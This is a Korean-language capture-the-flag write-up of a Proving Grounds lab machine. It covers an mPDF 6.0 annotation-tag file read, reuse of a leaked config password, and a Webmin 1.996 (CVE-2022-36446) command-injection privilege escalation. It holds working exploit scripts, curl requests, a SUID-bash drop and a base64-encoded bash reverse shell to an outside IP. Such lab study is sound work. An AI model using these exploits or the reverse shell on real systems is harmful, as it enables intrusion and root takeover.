---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/lfi-rfi
  - tech/cred/reuse
  - tech/web/cmd-injection
  - tech/pivot/ssh-tunnel
  - tech/lin/suid
type: machine
platform: pg
os: linux
ip: 192.168.248.232
ports: [22, 80]
ports_filtered: [10000]
services: [http, ssh]
cves: [CVE-2022-36446]
status: solved
manual_tags: true
manual_cves: true
tech_count: 5
---
# Outdated (PG Practice · Fundamental)

> [!info] 요약
> 타겟 192.168.248.232 · Ubuntu 20.04.5 · 난이도 Fundamental · 플래그 2개 (**2026-08-20 인스턴스**)
> 웹 80 = "HTML→PDF" 변환기, 뒤에 **mPDF 6.0**. `<annotation file="...">` 태그로 **임의 파일 읽기** → `/var/www/html/config/config.php` 에 박힌 DB 비번을 **SSH·Webmin 양쪽에 재사용**해 `svc-account` 로 로그인. tcp/10000 의 **Webmin 1.996** — 전 인터페이스에 떠 있지만 경로상 방화벽 때문에 밖에서만 안 보인다 — 에 SSH `-L` 로 붙어 **CVE-2022-36446**(package-updates 인증 후 명령주입)으로 root 컨텍스트 확보 → SUID bash 드롭 → root.

## 0. 이 박스에서 배우는 것

- **문서 변환기 = 서버측 파서**다. "HTML을 PDF로" 같은 입력창을 보면 그 파서의 태그 확장 기능(mPDF `<annotation>`, `<barcode>`, `<qr>`, wkhtmltopdf/Chrome headless 의 `file://`·SSRF)을 먼저 의심한다.
- mPDF `<annotation file=...>` 는 지정 파일을 PDF **첨부(EmbeddedFile)** 로 심는다. 화면엔 안 보여도 PDF 스트림을 뜯으면 원문이 나온다 — LFI 를 "출력에 안 보인다"고 포기하지 마라.
- **자격증명 재사용의 3연타**: config 파일의 비번 하나가 (1) SSH (2) Webmin unix/PAM 로그인 (3) 그 Webmin 을 통한 RCE 로 이어진다.
- Webmin 1.996 = **CVE-2022-36446**. 조건을 하나씩 바꿔도 응답이 안 변하면, 바꾸고 있는 조건이 아니라 **그 앞단이 막고 있는 것**이다. 여기선 `Referer` 였다.
- 리버스셸 아웃바운드가 막혀도 **이미 있는 SSH 세션 + SUID 드롭**으로 root 대화형 셸을 얻는다. 웹셸로 플래그 읽으면 OSCP 0점이므로 이 경로가 중요.
- **시험 출제 가능성**: mPDF/wkhtmltopdf LFI 는 "PDF 변환기" 웹앱에서 흔한 패턴. Webmin RCE 는 버전만 맞으면 공개 PoC 로 재현 가능. 둘 다 변형이 시험에 나올 법하다.

## 1. 정찰

### Nmap

```
# nmap -sCV -p- -Pn -A --min-rate 5000 192.168.248.232
Nmap scan report for 192.168.248.232
Host is up (0.090s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE    SERVICE          VERSION
22/tcp    open     ssh              OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp    open     http             Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Convert HTML to PDF Online
10000/tcp filtered snet-sensor-mgmt
```

세 포트뿐이다. **10000/tcp = filtered** 가 중요한 신호다. 같은 스캔이 `Not shown: 65532 closed tcp ports (reset)` 라고 적고 있다 — 닫힌 포트는 여기서 RST 로 답한다는 뜻인데, 10000 만 **아무 답이 없다**. 응답을 삼키는 무언가가 경로에 있다는 것이지 "서비스가 없다"가 아니다. 10000 은 Webmin 의 기본 포트라 침투 후 로컬에서 확인한다.

박스 이름이 "Outdated"라 구버전 소프트웨어를 노리라는 힌트지만, 이름만 믿고 파지 않는다. 1차 사료는 nmap 과 실제 배너다.

### 웹 80 — HTML to PDF

![[PG-Outdated-mpdf_80.png]]

입력창 하나에 Convert 버튼 하나. `html` 파라미터를 POST 하면 PDF 를 돌려준다(폼 action 은 `/index.php`, 입력 필드는 `<textarea name="html">`).

파서 정체는 응답 헤더와 PDF 메타데이터 양쪽에서 뽑는다. 이게 버전 판정의 독립 근거 두 개다.

```
$ curl -s -X POST -d 'html=hello' http://192.168.248.232/index.php -D hdr1.txt -o out1.pdf
$ cat hdr1.txt
HTTP/1.1 200 OK
Date: Thu, 20 Aug 2026 06:24:57 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 14683
Content-disposition: inline; filename="mpdf.pdf"
Cache-Control: public, must-revalidate, max-age=0
Pragma: public
Expires: Sat, 26 Jul 1997 05:00:00 GMT
Last-Modified: Thu, 20 Aug 2026 06:24:57 GMT
Content-Type: application/pdf
```

`filename="mpdf.pdf"` 가 첫 번째 근거. 두 번째는 PDF 안의 `/Producer` 인데, mPDF 는 이걸 **UTF-16BE** 로 쓰기 때문에 그냥 `strings` 로는 안 보이고 바이트를 직접 디코드해야 한다:

```
$ python3 -c "d=open('out1.pdf','rb').read(); i=d.find(b'/Producer'); \
  print(d[i+11:d.find(b')',i+11)].decode('utf-16-be'))"
mPDF 6.0
```

**mPDF 6.0** 확정. `[가정]` `/vendor/composer/installed.json` 의 `mpdf/mpdf v6.0.0` 로도 교차확인했으나 그 응답은 산출물로 남기지 않았다.

### 디렉터리 열거

```
$ gobuster dir -u http://192.168.248.232/ -w directory-list-2.3-medium.txt -x php,txt,html,bak,zip
/index.php           (Status: 200) [Size: 856]
/vendor              (Status: 301) [Size: 319] [--> http://192.168.248.232/vendor/]
/config              (Status: 301) [Size: 319] [--> http://192.168.248.232/config/]
```

`/config` 와 `/vendor` 가 301 로 잡힌다. 이름만 봐도 `/config/config.php` 가 다음 목표인데, 실제 읽기는 웹서버가 아니라 **LFI 로** 해야 한다 — 웹으로 `.php` 를 요청하면 PHP 가 실행돼 버려 주석 안의 비번이 안 보인다.

## 2. 취약점 분석 — mPDF `<annotation>` 임의 파일 읽기

### 왜 취약한가

`[가정]` `index.php` 는 LFI 로 읽었으나 그 출력을 산출물로 저장하지 않았다. 기억으로 재구성한 골자는 아래와 같고, **이 코드 블록만 실측 증거가 없다**:

```php
<?php
if (isset($_POST['html'])) {
    require_once __DIR__ . '/vendor/autoload.php';
    $mpdf = new \mPDF();
    $html = $_POST['html'];
    $mpdf->WriteHTML($html);   // ← 사용자 HTML 을 그대로 mPDF 에 넘김
    $mpdf->Output();
}
```

데이터 흐름 자체는 실측으로 성립한다 — `html` 파라미터에 넣은 확장 태그가 mPDF 파서까지 도달해 첨부를 만들어냈으니(아래), 사용자 입력이 필터 없이 `WriteHTML()` 계열로 들어간다는 결론은 안전하다. mPDF 6.0 은 표준 HTML 외에 자체 확장 태그를 파싱하는데, 그중 **`<annotation>`** 은 `file` 속성으로 지정한 로컬 파일을 PDF 첨부(FileAttachment / EmbeddedFile)로 삽입한다. 웹앱이 mPDF 에 신뢰 입력만 들어온다고 가정했기 때문에 이 기능이 무제한 파일 읽기가 된다.

### 왜 이 페이로드인가

```html
<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="a" pos-x="195" />
```

- `file="..."` — 실제로 읽어 첨부할 경로. 이게 핵심이고 나머지는 파서를 통과시키기 위한 장식.
- `content` / `icon` / `title` / `pos-x` — mPDF 가 annotation 을 그리려면 필요한 속성. 빠지면 태그가 무시되거나 첨부가 생성되지 않는다.

읽은 내용은 화면에 안 보이고 **PDF 안의 EmbeddedFile 스트림**으로 들어간다. 그래서 PDF 를 파싱해 스트림을 꺼내야 한다. `pdfdetach` 가 Kali 에 없어 직접 짰다 (`~/PG/Outdated/extract_attach.py`):

```python
#!/usr/bin/env python3
# mPDF annotation LFI - extract embedded file stream from generated PDF
import sys, re, zlib
d = open(sys.argv[1],'rb').read()
i = d.find(b'/Type /EmbeddedFile')
if i < 0:
    print('[!] no EmbeddedFile object'); sys.exit(1)
s = d.find(b'stream', i) + len(b'stream')
if d[s:s+2] == b'\r\n': s += 2
elif d[s:s+1] in (b'\n', b'\r'): s += 1
e = d.find(b'endstream', s)
raw = d[s:e]
try:
    out = zlib.decompress(raw)
except Exception:
    out = raw
sys.stdout.buffer.write(out)
```

FileAttachment 스트림은 `/FlateDecode` 라 zlib 압축을 풀어야 원문이 나온다. 압축이 아닐 때를 대비해 `try/except` 로 raw 폴백. `[!] no EmbeddedFile object` 분기가 중요한데, **읽기 실패는 에러가 아니라 "첨부 객체 자체가 없음"으로 나타나기 때문**이다.

한 줄 헬퍼로 묶었다 (`lfi.sh`):

```bash
#!/bin/bash
# mPDF 6.0 <annotation> arbitrary file read against http://192.168.248.232/index.php
# usage: ./lfi.sh /etc/passwd
F="$1"
curl -s -m 30 -X POST --data-urlencode "html=<annotation file=\"$F\" content=\"$F\" icon=\"Graph\" title=\"a\" pos-x=\"195\" />" http://192.168.248.232/index.php -o /tmp/lfi.pdf
python3 ~/PG/Outdated/extract_attach.py /tmp/lfi.pdf
```

`--data-urlencode` 를 쓰는 이유: 페이로드에 `<`, `>`, `"`, `/`, 공백이 잔뜩이라 `-d` 로 그냥 보내면 서버가 받는 값이 깨진다. urlencode 로 감싸야 원형이 넘어간다.

```
$ ./lfi.sh /etc/passwd
root:x:0:0:root:/root:/bin/bash
...
fwupd-refresh:x:113:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
svc-account:x:1000:1000::/home/svc-account:/bin/bash    # ← 35줄 중 마지막, 유일한 로그인 유저
```

`php://filter/convert.base64-encode/resource=/etc/passwd` 도 통한다(mPDF 가 스트림 래퍼를 그대로 연다) — base64 로 인코딩된 passwd 를 받았다. 다만 SSH 키(`/home/svc-account/.ssh/id_rsa`)나 `/etc/shadow` 는 www-data 권한 밖이라 `[!] no EmbeddedFile object` 로 돌아왔다. **첨부가 아예 안 만들어지면 곧 권한 부족 신호**다.

## 3. Foothold — config.php 자격증명 재사용

`/config/config.php` 를 LFI 로 읽었다:

```php
<?php
/* todo: check if still required
$servername = "localhost";
$username = "svc-account";
$password = "best&_#Password@2021!!!";
$dbname = "project";

$conn = new mysqli($servername, $username, $password, $dbname);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}
*/
```

전체가 블록 주석 안이라 브라우저로 `/config/config.php` 를 열면 **빈 화면**이 나온다. LFI 로 소스를 봐야만 보이는 값이다. `passwd` 에서 본 `svc-account` 와 이름이 일치 → SSH 재사용을 노린다.

```
$ sshpass -p 'best&_#Password@2021!!!' ssh svc-account@192.168.248.232
svc-account@outdated:~$ id
uid=1000(svc-account) gid=1000(svc-account) groups=1000(svc-account)
```

**user 플래그** (`~/PG/Outdated/proof_user.txt`, 대화형 SSH 세션):

```
svc-account
uid=1000(svc-account) gid=1000(svc-account) groups=1000(svc-account)
outdated
192.168.248.232 
Thu 20 Aug 2026 06:28:36 AM UTC
a86881c4c605f79f5388ddc73e57866e
Connection to 192.168.248.232 closed.
```

경로: `/home/svc-account/local.txt`.

## 4. 권한상승 — Webmin 1.996 CVE-2022-36446

### 열거로 무엇을 봤는가

반사 명령들을 스크립트 하나(`enum.sh`)로 묶어 SSH 로 밀어 넣고 `enum_user.txt` 로 받았다. 원문 발췌:

```
=== id ===
uid=1000(svc-account) gid=1000(svc-account) groups=1000(svc-account)
=== sudo -n -l ===
sudo: a password is required
=== SUID ===
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/bin/chfn
/usr/bin/umount
/usr/bin/mount
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/chsh
=== CAPS ===
/snap/core20/1778/usr/bin/ping = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
=== crontab -l ===
no crontab for svc-account
=== listening ===
State   Recv-Q   Send-Q     Local Address:Port      Peer Address:Port  Process  
LISTEN  0        511              0.0.0.0:80             0.0.0.0:*              
LISTEN  0        4096             0.0.0.0:10000          0.0.0.0:*              
LISTEN  0        4096       127.0.0.53%lo:53             0.0.0.0:*              
LISTEN  0        128              0.0.0.0:22             0.0.0.0:*              
=== uname ===
Linux outdated 5.4.0-136-generic #153-Ubuntu SMP Thu Nov 24 15:56:58 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
NAME="Ubuntu"
VERSION="20.04.5 LTS (Focal Fossa)"
=== webmin ver ===
1.996
```

`sudo -n -l` 은 비번을 요구했고, 비번을 넣어도 막힌다:

```
$ sudo -l
[sudo] password for svc-account: Sorry, user svc-account may not run sudo on outdated.
```

SUID 는 Ubuntu 20.04 표준 목록 그대로, capabilities 다섯 개도 전부 네트워크용(`cap_net_raw`/`cap_net_bind_service`)이라 쓸 게 없다. cron 도 `/etc/cron.d` 에 배포판 기본 파일(`e2scrub_all`·`php`·`popularity-contest`)뿐이었다.

남는 건 `ss` 의 세 번째 줄이다. **`0.0.0.0:10000`** — Webmin 은 로컬 전용으로 묶여 있는 게 아니라 **모든 인터페이스에 떠 있다.** nmap 에서 filtered 로 보였던 이유는 바인딩이 아니라 **경로상 방화벽**이 트래픽을 삼켰기 때문이다. 그러니 박스 안에서는 그냥 붙으면 되고, Kali 에서 붙으려면 SSH 로컬 포워딩만 하나 걸면 된다:

```
$ ssh -L 127.0.0.1:10000:127.0.0.1:10000 svc-account@192.168.248.232
```

`-L <로컬바인드>:<원격이 보는 주소>:<원격포트>` — Kali 의 127.0.0.1:10000 으로 온 것을 SSH 세션 반대편이 자기 127.0.0.1:10000 으로 내보낸다. 이후 curl 은 전부 Kali 에서 `https://127.0.0.1:10000/` 로 친다. `-k` 는 MiniServ 의 자체서명 인증서 때문에 필수고, 스킴이 `https` 인 것도 중요하다 — MiniServ 는 SSL 모드로 떠 있어 평문 http 로 붙으면 정상 응답이 안 온다.

버전 근거 두 개 — `/usr/share/webmin/version` = `1.996`(위 열거), 그리고 나중에 받은 응답 HTML 의 제목:

```
<title>Software Package Updates - Webmin 1.996 on outdated (Ubuntu Linux 20.04.5)</title>
```

### 왜 그것이 권한상승이 되는가

Webmin 은 unix/PAM 인증을 쓸 수 있고, `svc-account` 자격증명이 그대로 통한다:

```
$ curl -sk -c cj.txt -H 'Cookie: testing=1' \
    https://127.0.0.1:10000/session_login.cgi \
    --data 'user=svc-account&pass=best%26_%23Password%402021%21%21%21'
$ cat cj.txt
# Netscape HTTP Cookie File
#HttpOnly_127.0.0.1	FALSE	/	TRUE	0	sid	8066e35697e3c9f53ff07781c2dfff48
```

쿠키 항아리에 `sid` 가 떨어진 것이 로그인 성공 신호다(4번째 필드 `TRUE` = secure, 접두사 `#HttpOnly_` = httpOnly). `-H 'Cookie: testing=1'` 이 필요한 이유는 MiniServ 가 쿠키를 못 받는 클라이언트를 로그인 폼으로 되돌리기 때문이다. 비번의 `&`·`#`·`@`·`!` 는 POST 바디에서 전부 퍼센트 인코딩해야 한다 — `&` 를 날것으로 보내면 거기서 파라미터가 잘린다.

이 sid 로 모듈 페이지가 열린다:

```
$ curl -sk -b cj.txt https://127.0.0.1:10000/package-updates/ -o pu.html
$ grep -o '<title>[^<]*</title>' pu.html
<title>Software Package Updates - Webmin 1.996 on outdated (Ubuntu Linux 20.04.5)</title>
```

**200 으로 모듈 본문이 돌아온 것 자체**가 svc-account 에게 package-updates 접근권이 있다는 증거다 — ACL 이 없으면 Webmin 은 모듈 대신 거부 페이지를 준다. 응답 루트 태그의 `data-package-updates="1"` 도 같은 이야기를 한다. 같은 태그에 있는 `data-access-level="0"` 을 근거로 삼으면 안 된다. 그건 **거부당한 응답에도 똑같이 붙어 있는** 사용자 전역 속성이다.

**CVE-2022-36446** (Webmin < 1.997): package-updates 모듈이 설치할 패키지 이름을 셸 명령으로 조립할 때 이스케이프를 사실상 하지 않는다. 싱크는 `software/apt-lib.pl` 의 `update_system_install`:

```perl
$update = join(" ", map { quotemeta($_) } split(/\s+/, $update));
$update =~ s/\\(-)|\\(.)/$1$2/g;                                    # ← quotemeta 를 도로 벗긴다
local $cmd = "$apt_get_command -y ".($force ? " -f" : "")." install $update";
...
&open_execute_command(CMD, "$cmd <".quotemeta($yesfile), 2);
```

`quotemeta` 로 `;` → `\;` 로 이스케이프해 놓고, 바로 다음 줄 정규식이 `\<문자>` → `<문자>` 로 백슬래시를 전부 벗겨버린다. 결과적으로 `;`, `|` 같은 메타문자가 그대로 셸에 도달하고, Webmin 데몬이 root 로 도니 주입한 명령도 root 로 실행된다.

관측된 명령이 `apt-get -y  install` 로 공백 두 칸인 것도 여기서 나온다 — 호출부(`package_install`)가 세 번째 인자로 `1` 을 넘겨 `$force` 가 거짓이 되고, `($force ? " -f" : "")` 가 빈 문자열이 되면서 자리만 남는다.

### 익스플로잇 — 발화 조건

주입 지점은 `update.cgi` 의 `u` 파라미터(패키지 이름). 실제로 root 명령이 돌기까지 걸리는 것이 있었다.

**① 패키지 이름이 `/` 에서 잘린다.** `update.cgi` 는 각 항목을 `($p, $s) = split(/\//, $ps);` 로 쪼개 앞 조각만 패키지 이름으로 쓴다(`/` 뒤는 패키지 시스템 이름 자리다). `/tmp/...` 같은 슬래시 든 페이로드는 거기서 죽는다. **명령 전체를 base64 로 감싸** 슬래시를 없앤다:

```bash
$ echo -n 'cp /bin/bash /tmp/rootbash; chmod 4777 /tmp/rootbash' | base64 -w0
Y3AgL2Jpbi9iYXNoIC90bXAvcm9vdGJhc2g7IGNobW9kIDQ3NzcgL3RtcC9yb290YmFzaA==
```

base64 알파벳에는 `/` 가 **들어갈 수 있다.** 페이로드마다 실제로 확인해야 하고, 걸리면 hex 로 바꾼다(`echo <hex> | xxd -r -p | bash` — hex 알파벳은 `0-9a-f` 뿐이라 안전하다).

**② `mode=new`.** `update.cgi` 는 `&package_install($p, $s, $in{'mode'} eq 'new')` 로 호출한다. `package_install` 안에서 그 세 번째 인자가 거짓이면, 존재하지 않는 이름(=주입 문자열)은 설치 가능 목록 어디에도 없으므로:

```perl
if (!$pkg && $install) { $pkg = { ... }; }                          # mode=new 일 때만 "있다 치고" 진행
if (!$pkg) { print &text('update_efindpkg', $name); return ( ); }   # 아니면 여기서 끝
```

`update_system_install` 에 도달하지 못하고 return 한다. **이건 진짜 필수 조건이다.**

**③ `Referer` 헤더.** 이 박스에서 시간을 다 태운 곳이다(6장 3번).

`confirm=1` 도 함께 보냈다. 다만 이것이 **필수는 아니다** — `update.cgi` 는 `confirm` 이 없으면 `list_package_operations`(= `apt-get -s install …`)로 먼저 시뮬레이션하는데, 주입 문자열은 어떤 패키지에도 매칭되지 않아 결과가 **빈 배열**이 되고, 코드가 `if (@ops) { 확인 폼 } else { 바로 설치 }` 라 그대로 설치 분기로 떨어진다. `confirm=1` 은 그 한 번의 왕복을 건너뛰게 할 뿐이다. 실측에서 이 조건만 따로 떼어 검증한 적은 없다.

최종 요청:

```bash
SID=8066e35697e3c9f53ff07781c2dfff48
CMD='cp /bin/bash /tmp/rootbash; chmod 4777 /tmp/rootbash'
B64=$(echo -n "$CMD" | base64 -w0)     # 슬래시 없는지 눈으로 확인
curl -sk -b "sid=$SID" -e 'https://127.0.0.1:10000/package-updates/' \
  'https://127.0.0.1:10000/package-updates/update.cgi' \
  --data-urlencode "u=;echo $B64|base64 -d|bash;" \
  --data-urlencode 'confirm=1' --data-urlencode 'mode=new'
```

`-e <URL>` 이 `Referer` 를 붙인다. `-b` 는 세션 쿠키.

응답 본문이 스스로 실행을 증언한다. 아래는 **먼저 시도했던 리버스셸 페이로드**의 응답(`resp2.html`)에서 뜯은 것 — rootbash 요청의 응답은 저장하지 않았으므로 실측으로 남은 건 이쪽이다:

```html
<tt>apt-get -y  install ;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIwNy80NDMgMD4mMQ==|base64 -d|bash;</tt>
...
0 upgraded, 0 newly installed, 0 to remove and 78 not upgraded.
```

(`YmFzaCAt...` 를 디코드하면 `bash -i >& /dev/tcp/192.168.45.207/443 0>&1`.) `apt-get -y install` 뒤에 내 `;echo...|bash;` 가 그대로 붙어 있다 — **명령은 확실히 root 로 실행됐다.** 그런데도 리버스셸은 안 붙었다(6장 4번). 같은 요청에서 `u=` 만 rootbash 명령으로 바꿔 SUID bash 를 떨궜다:

```
$ ls -la /tmp/rootbash
-rwsrwxrwx 1 root root 1183448 Aug 20 06:36 /tmp/rootbash
```

`4777` 이라 `s` 비트가 owner 실행 자리에 붙고 owner 는 root — `bash -p` 로 실행하면 euid 가 유지된다.

### root 플래그

SUID bash 를 svc-account SSH 세션(대화형 tty)에서 `-p` 로 실행 — **웹셸이 아니라 실 셸**에서 원위치 `cat` (`proof_root.txt` 원문):

```
root
uid=1000(svc-account) gid=1000(svc-account) euid=0(root) groups=1000(svc-account)
outdated
192.168.248.232 
Thu 20 Aug 2026 06:36:56 AM UTC
===
total 27756
drwx------  7 root root     4096 Aug 20 06:11 .
drwxr-xr-x 20 root root     4096 Jan  7  2021 ..
drwxr-xr-x  3 root root     4096 Jan 12  2023 app
lrwxrwxrwx  1 root root        9 Jan 12  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root     3106 Dec  5  2019 .bashrc
drwxr-xr-x  3 root root     4096 Jan 12  2023 .config
-rw-r--r--  1 root root      589 Jan 12  2023 index.html
drwxr-xr-x  3 root root     4096 Jan  7  2021 .local
-rw-r--r--  1 root root      161 Dec  5  2019 .profile
-rw-------  1 root root       33 Aug 20 06:11 proof.txt
drwxr-xr-x  3 root root     4096 Jan  7  2021 snap
drwx------  2 root root     4096 Jan  7  2021 .ssh
-rw-r--r--  1 root root 28374208 Jul  4  2022 webmin_1.996_all.deb
===
b5fd4782fc9d5e2da021442ffb60c9eb
Connection to 192.168.248.232 closed.
```

경로: `/root/proof.txt`. `euid=0(root)` 로 읽었다 — `bash -p` 가 SUID euid 를 떨어뜨리지 않는다. `/root/` 에 `webmin_1.996_all.deb` 가 그대로 있어 의도된 경로임이 확인되고, `/root/.bash_history` 가 `/dev/null` 로 심볼릭된 것도 여기서 보인다.

## 5. 플래그

| | 값 (2026-08-20 인스턴스) | 경로 | 획득 |
|---|---|---|---|
| user | `a86881c4c605f79f5388ddc73e57866e` | `/home/svc-account/local.txt` | 대화형 SSH (svc-account) |
| root | `b5fd4782fc9d5e2da021442ffb60c9eb` | `/root/proof.txt` | 대화형 SSH + `/tmp/rootbash -p` (euid=0) |

PG 는 박스를 리버트할 때마다 플래그를 새로 만든다. 위 값은 **2026-08-20 인스턴스 한정**이고, 재현 자료는 값이 아니라 **경로와 획득 방법**이다.

## 6. 막혔던 지점 / 시행착오

산출물 mtime 으로 재구성한 실제 시간표(KST. 타겟이 찍은 로그는 UTC 라 9시간 차 — `06:28 UTC` = `15:28 KST`):

| 시각 | 산출물 | 무슨 일 |
|---|---|---|
| 15:24:40 | `quick.log` | top-1000 스캔 |
| 15:24:45 | `nmap.log` | 전 포트 스캔 |
| 15:24:57 | `hdr1.txt` · `out1.pdf` | mPDF 6.0 지문 확보 |
| 15:25:32 | `try1_annotation_passwd.pdf` | LFI 첫 성공 |
| 15:27:49 | `gobuster.log` | `/config`·`/vendor` |
| 15:28:17 | `config.php.txt` | 자격증명 |
| **15:28:36** | `proof_user.txt` | **user 플래그 — 시작 4분** |
| 15:29:04 | `enum_user.txt` | 열거 일괄 |
| 15:29:55 | `cj.txt` | Webmin 로그인 |
| 15:30:21 | `pu.html` | package-updates 접근 확인 |
| 15:30:46 | `exploit_resp.html` | **첫 익스플로잇 — Referer 차단** |
| 15:35:54 | `resp2.html` | 명령 실행 성공(리버스셸 페이로드) |
| **15:36:56** | `proof_root.txt` | **root — 전체 12분** |

(실패 로그는 `try1`·`try4` 만 남아 있다. 그 사이 `try2`·`try3` 는 보존되지 않았다.)

1. **LFI 출력이 안 보임** — 처음 `<annotation>` 을 보내니 PDF 는 나오는데 `/etc/passwd` 내용이 화면에 없었다. mPDF 는 파일을 **본문에 렌더하지 않고 첨부**한다. `strings out.pdf | grep EmbeddedFile` 로 첨부 객체를 확인하고, 스트림이 `/FlateDecode` 라 직접 zlib 로 풀어야 했다. "출력에 안 나온다 = 실패"로 넘겼으면 놓쳤을 것.

2. **SSH 키·shadow 읽기 실패** — `/home/svc-account/.ssh/id_rsa`, `/root/.ssh/id_rsa`, `/etc/shadow` 전부 `[!] no EmbeddedFile object` 로 돌아왔다. www-data 권한 밖이라 mPDF 가 못 읽은 것. 권한 되는 파일(`/etc/passwd`, 웹루트 소스)로 방향을 틀어 config.php 를 찾았다.

3. **CVE 발화 조건 — 하나가 나머지를 전부 가리고 있었다.** 여기가 이 박스의 실체다(15:30:46 → 15:35:54, 약 5분).

   첫 요청부터 마지막 직전까지 응답이 **계속 302** 였다. 그 사이 슬래시 잘림을 의심해 base64 로 감싸 보고, `confirm=1` 을 넣어 보고, `mode=new` 를 넣어 봤지만 응답은 **한 번도 변하지 않았다.** 조건을 바꾸는데 응답이 그대로면, 바꾸고 있는 조건이 아니라 **그 앞단이 막고 있는 것**이다.

   실수는 응답 본문을 안 본 것이었다. `-o` 로 파일에 받아 두고 상태코드만 봤는데, 그 파일(`exploit_resp.html`)을 열자 Webmin 이 답을 그대로 적어 두고 있었다:

   ```html
   <title>Security Warning</title>
   ...
   <b>Warning!</b> Webmin has detected that the program
   <tt>https://127.0.0.1:10000/package-updates/update.cgi?xnavigation=1</tt>
   was linked to from an unknown URL, which appears to be outside the Webmin server.
   ...
   Find the line <tt>referers_none=1</tt> and change it to <tt>referers_none=0</tt>.
   ```

   `-e 'https://127.0.0.1:10000/package-updates/'` 로 `Referer` 를 붙이자 즉시 200 + `apt-get -y  install ;echo...` 출력.

   덧붙여, 302 는 referer 체크가 만든 것이 **아니다.** Webmin 의 referer 거부 경로(`web-lib-funcs.pl` 의 `if (!$trust)`)는 경고 본문을 뱉고 그냥 `exit` 한다. 302 가 섞여 나온 건 요청 URL 에 `?xnavigation=1` 이 붙어 있었기 때문으로, 그 앞의 테마 리다이렉트 분기(`REQUEST_URI =~ /xnavigation=1/` → `&redirect("/")`)가 함께 탄 결과다. 그래서 **상태코드는 302, 본문은 경고 페이지**라는 이상한 응답이 나왔다. 상태코드만 보고 있었으면 영영 몰랐을 정보가 본문에 다 있었다.

4. **리버스셸 무응답** — 조건을 다 맞춘 뒤 첫 페이로드는 `bash -i >& /dev/tcp/192.168.45.207/443 0>&1` 리버스셸이었다. 응답(`resp2.html`)은 200 이었고 apt 출력에 내 명령이 그대로 찍혀 있는데도 nc 리스너엔 아무것도 안 왔다. tcpdump 로도 connect-back 이 안 보여 아웃바운드 필터로 판단했다. 리버스셸에 매달리지 않고 **이미 있는 SSH + SUID 드롭**으로 우회했다. 이게 오히려 OSCP 규정상 안전한 경로(웹셸 회피)였다.

**교훈 일반화**: 인증 후 RCE 에서 "콜백이 없다"와 "명령이 안 돈다"는 완전히 다른 문제인데 증상이 똑같다. 둘을 분리하는 가장 싼 방법은 **네트워크를 안 쓰는 마커**(`id > /tmp/x` 를 base64 로 감싼 것)를 먼저 쏘는 것이다. 이 박스는 순서가 반대였다 — 발화 조건 문제(3번)를 풀고 나서야 네트워크 문제(4번)가 드러났다.

## 7. OSCP 시험 관점

1. **"HTML→PDF" / 문서변환기 = 파서 취약점 1순위.** mPDF `<annotation file=>`, `<barcode>`; wkhtmltopdf/headless Chrome 의 `<iframe src=file://>`·SSRF. 버전을 뽑으면(응답 헤더 `filename`, PDF `/Producer`, `vendor/composer/installed.json`) 바로 공개 PoC 로 간다. `/Producer` 는 UTF-16BE 라 `strings` 로는 안 보인다.
2. **자동 도구 없이**: LFI 는 curl + `--data-urlencode` 로 수동. PDF 첨부 추출은 위 파이썬 20줄. Webmin RCE 도 curl 세 파라미터로 손으로 친다 — metasploit 에 `webmin_package_updates_rce` 모듈이 있지만 시험에서 msf 는 **1대 한정**이라 수동 버전을 익혀두는 게 이득이다.
3. **filtered 포트를 버리지 마라.** nmap `10000/filtered` 는 "안 열림"이 아니다. 같은 스캔이 다른 포트를 `closed (reset)` 이라 적고 있다면 filtered 는 **응답이 삼켜진 것**이다. 침투 후 `ss -lntp` 로 확인하고 SSH `-L` 로 붙는다. 여기선 실제 바인딩이 `0.0.0.0` 이었다 — 로컬 전용 서비스라서 안 보였던 게 아니다.
4. **응답이 안 변하면 앞단을 의심하라.** 조건 A·B·C 를 바꿔가며 던지는데 응답이 한 글자도 안 변하면, 요청이 그 조건을 판정하는 코드까지 도달조차 못 하고 있는 것이다. 인증 후 RCE 의 앞단 후보: Referer/CSRF 체크, 세션 만료, ACL, 리버스프록시.
5. **상태코드 말고 본문을 봐라.** `-o` 로 받아 두고 코드만 보는 습관이 여기선 몇 분을 태웠다. Webmin 은 거부 사유와 해결법(`referers_none`)을 본문에 다 적어 준다. `curl -sk ... | head -40` 을 기본으로.
6. **인코딩으로 문자 제약을 우회한다.** 페이로드에서 `/` 가 잘리면 base64, base64 출력에도 `/` 가 섞이면 hex(`xxd -r -p`).
7. **리버스셸이 안 붙으면 즉시 대안으로.** 아웃바운드 필터는 흔하다. 이미 자격증명이 있으면 SSH + SUID 드롭이 더 확실하고, 웹셸 플래그 0점 규정도 피한다.
8. **시간 배분**: 전체 12분 중 user 까지 4분, CVE 발화 조건에 5분. 발화 조건을 추측 대신 소스로 읽은 것이 빨랐다.

## 8. 방어 관점

- mPDF 를 신뢰 경계 밖 입력에 쓰지 마라. 최소한 `<annotation>`·스트림 래퍼를 차단하고 최신 버전으로 올린다. HTML→PDF 렌더러는 격리 컨테이너/제한 계정에서 돌린다.
